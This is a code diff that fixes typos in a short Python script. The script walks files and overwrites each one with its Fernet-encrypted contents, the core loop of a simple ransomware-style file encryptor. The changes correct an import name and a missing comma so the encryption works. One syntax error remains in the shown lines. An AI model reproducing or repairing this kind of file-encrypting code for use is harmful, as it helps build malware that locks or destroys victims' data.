@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 import os
-from cryptography.fernet import Frenet
+from cryptography.fernet import Fernet
 
 #lets find some files
 
@@ -24,5 +24,5 @@ for file in files:
         with open(file, "rb") as thefile:
                 contents = thefile.read()
         contents_encrypted = Fernet(key).encrypt(contents)
-        with open(file "wb") as thefile:
+        with open(file, "wb") as thefile:
                 thefile.write(contents encrypted)
